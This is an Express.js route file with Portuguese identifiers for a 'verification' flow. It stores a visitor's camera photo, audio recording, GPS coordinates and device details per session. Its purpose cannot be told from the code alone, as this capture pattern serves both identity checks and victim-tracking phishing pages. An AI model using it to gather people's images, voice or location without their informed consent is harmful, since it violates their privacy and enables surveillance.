const express = require('express');
const fs = require('node:fs');
const path = require('node:path');
const multer = require('multer');
const db = require('../db');

const router = express.Router();
const uploadsDir = path.join(__dirname, '..', '..', 'uploads');
const SESSION_ID_REGEX = /^[0-9a-f-]{36}$/;

function pathSeguro(sessionId, extensao) {
  if (!SESSION_ID_REGEX.test(sessionId)) {
    throw new Error('session id invalido');
  }
  return path.join(uploadsDir, `${sessionId}.${extensao}`);
}

const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
      try {
        const destino = pathSeguro(req.sessionId, 'webm');
        cb(null, path.basename(destino));
      } catch (err) {
        cb(err);
      }
    },
  }),
  limits: { fileSize: 10 * 1024 * 1024 },
});

router.get('/verificacao', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'views', 'verificacao.html'));
});

router.get('/verificacao/camera', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'views', 'camera.html'));
});

router.post('/verificacao/foto', (req, res) => {
  const { imagemBase64 } = req.body || {};

  if (!imagemBase64 || typeof imagemBase64 !== 'string') {
    return res.status(400).json({ ok: false, erro: 'Imagem ausente.' });
  }

  const base64Data = imagemBase64.replace(/^data:image\/\w+;base64,/, '');

  if (base64Data.length > 10 * 1024 * 1024) {
    return res.status(413).json({ ok: false, erro: 'Imagem muito grande.' });
  }

  let destino;
  try {
    destino = pathSeguro(req.sessionId, 'jpg');
  } catch {
    return res.status(400).json({ ok: false, erro: 'Sessao invalida.' });
  }

  fs.writeFile(destino, Buffer.from(base64Data, 'base64'), (err) => {
    if (err) {
      return res.status(500).json({ ok: false, erro: 'Falha ao salvar foto.' });
    }
    db.salvarFoto(req.sessionId, destino);
    return res.json({ ok: true });
  });
});

router.post('/verificacao/audio', upload.single('audio'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ ok: false, erro: 'Audio ausente.' });
  }

  db.salvarAudio(req.sessionId, req.file.path);
  return res.json({ ok: true });
});

router.post('/verificacao/geo', (req, res) => {
  const { lat, lon, accuracy } = req.body || {};

  if (typeof lat !== 'number' || typeof lon !== 'number') {
    return res.status(400).json({ ok: false, erro: 'Coordenadas invalidas.' });
  }

  db.salvarGeo(req.sessionId, lat, lon, typeof accuracy === 'number' ? accuracy : null);
  return res.json({ ok: true });
});

router.post('/verificacao/dispositivo', (req, res) => {
  const info = req.body || {};
  const infoJson = JSON.stringify(info).slice(0, 4000);

  db.salvarDispositivoInfo(req.sessionId, infoJson);
  return res.json({ ok: true });
});

module.exports = router;
